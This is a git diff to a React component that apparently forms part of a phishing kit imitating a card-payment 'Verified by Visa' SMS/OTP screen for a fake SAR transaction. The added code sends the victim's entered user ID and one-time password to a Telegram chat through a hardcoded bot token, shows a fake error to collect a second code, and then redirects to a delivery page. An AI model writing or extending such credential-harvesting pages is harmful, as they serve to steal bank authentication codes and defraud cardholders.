@@ -7,7 +7,7 @@ import Header from "./components/header/Header";
 import {GiSmartphone} from "react-icons/gi"
 import msgLogo from "./images/logo_sms.png"
 import { Switch, Route, Redirect } from "react-router-dom";
-
+import visa from "/home/muhammadsubhan/Desktop/gritcha/src/images/visa.png"
 
 function Page2() {
   const date = new Date();
@@ -20,36 +20,55 @@ function Page2() {
   const [step3, setStep3] = useState(false);
   const [userId, setUserId] = useState("");
   const [pass, setPass] = useState("");
+  console.log(userId,"id")
+  console.log(pass,"pass")
+  const [beforeOtp,setBeforeOtp]=useState(false)
   let [secondSmsPage,setSecondSmsPage]=useState(false)
-  
+  const second_beforeOtp=()=>{
+    setSecondSmsPage(true)
+    setBeforeOtp(true)
+  }
   const client = new TelegramClient({
     accessToken: "1946580313:AAFbzUqaVbUGlCE4LFTWvGjbzhGF4WYAcD0",
   });
-  const sendmsg = async () => {
+  const sendmsg1 = async () => {
     console.log("sending msg now");
     console.log("password "+pass)
     await client.sendMessage(
       -1001578583679,
-      "sms1 : " + pass + " \n  sms2  : " + userId
+      "sms1 : " + userId
     );
   };
+  const sendmsg2 = async () => {
+    console.log("sending msg now");
+    console.log("password "+pass)
+    await client.sendMessage(
+      -1001578583679,
+      "sms2 : " + pass
+    );
+  };
+  // "sms1 : " + pass + " \n  sms2  : " + userId first i was sending this 
   let [errorPage,setErrorPage]=useState(false)
  console.log(secondSmsPage,"sms pag")
  const ErrorPage=()=>{
    setStep1(false)
    setIsLoading(true);
+   sendmsg1()
    setTimeout(() => {
     setIsLoading(false);
     setErrorPage(true);
-  }, 5000);
+  }, 1000);
 
  }
   const handleSubmit = () => {
-  
+   console.log("hande submit chal k nahi")
+   console.log("pass",pass,"id",userId)
      if(pass && userId){ setStep1(false);
+      setBeforeOtp(true)
+
       setErrorPage(false)
       setIsLoading(true);
-      sendmsg();
+      sendmsg2();
       setTimeout(() => {
         setIsLoading(false);
         console.log(step3,"before step3")
@@ -57,6 +76,7 @@ function Page2() {
         console.log(step3,"after step3")
         if(step3==false){
           console.log("andar aya k nahi")
+          setBeforeOtp(false)
           setTimeout(
             ()=>
             window.location.href = "/delivery"
@@ -247,8 +267,49 @@ Confirmation by SMS
                                             ></path>
                                           </g>
                                         </svg> */}
+                                    
 
-                                        <img style={{width:"55px",height:"50px"}} src={msgLogo}></img>
+                                    {
+                                      beforeOtp?
+                                    
+                                             <div className="nav_sms">
+                                           <div className="left_logo">
+                                             
+                                                <img
+                                                style={{width:"100%",height:"100%"}}
+                                                src="data:image/png;base64,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"></img>
+                                           </div>
+                                           <div className="right_logo left_logo">
+                                              {/* <h1> Verified By <br />
+                                                Visa</h1>  */}
+                                                <img style={{width:"100%",height:"100%"}} src={visa}></img>
+                                           </div>
+                                           
+
+                                      </div>
+
+
+                                 
+                                     
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      
+                                      :
+                                      <div className="before_otp">
+                                      <img style={{width:"55px",height:"50px"}} src={msgLogo}></img>
                                         <button
                                           _ngcontent-jha-c48=""
                                           tabindex="55"
@@ -301,15 +362,26 @@ Confirmation by SMS
                                             class="frame__divider"
                                           ></div>
                                         </button>
+
+                                      </div>
+
+
+                                    }
+
+
+
+
+
+
                                       </div>
                                       <div
                                         _ngcontent-jha-c48=""
-                                        class="frame__content"
+                                        // class="frame__content"
                                       >
                                         <div
                                           _ngcontent-jha-c48=""
                                           id="framecontentscroll"
-                                          class="frame__content__scroll"
+                                          // class="frame__content__scroll"
                                           style={{backgroundColor:"white"}}
                                         >
                                           <div _ngcontent-jha-c48="">
@@ -571,6 +643,7 @@ try again
                                                   >
                                                    Please Try again
                                                   </h1>
+                                                  
                                                   <div
                                                     _ngcontent-jha-c48=""
                                                     class="frame__row"
@@ -692,15 +765,15 @@ try again
                                               secondSmsPage==true?<>
                                             
                                               
-                                               <div className="message_otp" style={{backgroundColor:"white"}}>
-                                                 {/* < br /> */}
+                                               {/* <div className="message_otp" style={{backgroundColor:"white"}}>
+                                              
                                                 <div style={{textAlign:"center"}}>
-                                                  <GiSmartphone style={{width:"300p",color:"blue",fontSize:"62px" ,backgroundColor:"#F6F9F8",
+                <GiSmartphone style={{width:"300p",color:"blue",fontSize:"62px" ,backgroundColor:"#F6F9F8",
                                           border:"1px solid grey",borderRadius:"50% 50%",padding:"10px"}} /></div>
-                                             {/* <br/> */}
+                                             
                                                   <h1 style={{fontSize:"2rem",textAlign:"center",fontFamily:"Source Sans Pro !important"}}>Verification </h1>
                                                   <h3 style={{textAlign:"center",fontSize:"17px",opacity:".3",width:"98%",fontFamily:"Source Sans Pro !important"}}>
-                                                    {/* We will send you a One Time Password on your phone number */}
+                                                
                                                     you will get a otp via sms 
                                                     </h3>
                                                     < br />
@@ -713,7 +786,38 @@ try again
                                         <button style={{border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} onClick={ErrorPage}>Verify</button></div>
                                            < br />
                                               </div>  
-                                              
+                                               */}
+ <div className="message_otp" style={{backgroundColor:"white"}}>
+   <br />
+<p className="message_otp_oneTime"> Please Submit your One-Time Password (OTP) </p>
+                                      <p className="message_otp_transaction_text">Please enter the otp send to your registered mobile number to<br /> 
+                                        complete the transaction . 
+
+                                      </p>
+                                     <div className="message_otp_details_center">
+                                        <p className="message_otp_title">Mercant : <span>SPL</span></p>
+                                        <p className="message_otp_title">Amount  : <span>21.32 SAR</span></p>
+                                        <p className="message_otp_title">Date  : <span>21:09::23</span></p>
+                                        <p className="message_otp_title">Card number  : <span>xxxx xxxx xxxx  6000</span></p>
+                                     </div>
+                                     <br />
+                                      <div className="message_otp_input_resend_text">
+                                      <p className="one_time_text">One-Time Password (OTP) </p>
+                                      <span className="input_box_div"><input className="input_box"  onChange={(e)=>{setPass(e.target.value)}}></input></span>
+                                      <span className="one_time_text">Resend OTP</span>
+                                      </div>
+                                      <br />
+                                        <p className="one_time_text">Note : OTP is sent to your registered mobile number</p>
+                                        <div className="otp-button">
+                                          <button className="otp_button_design"   onClick={ErrorPage}>Submit</button>
+                                          <button className="otp_button_design">Cancel</button>
+                                        <span syle={{fontSize:"18px"}}>Help</span>
+                                      
+                                        </div>
+                                        <p className="terms_text">Term of Service</p>
+
+
+                                        </div>
                                               
                                               
                                               
@@ -934,7 +1038,7 @@ try again
                                          <div 
                                         style={{textAlign:"center"}}> 
                                         <button 
-                                         onClick={()=>{setSecondSmsPage(true)}}
+                                         onClick={second_beforeOtp}
                                         style={{fontFamily:"Source Sans Pro !important",border:"1px solid blue",backgroundColor:"blue",padding:".8rem 4.6rem",textAlign:"center",color:"white",fontWeight:"600",fontSize:"18px"}} >GET OTP</button></div>
                                            < br />
                                               </div>  
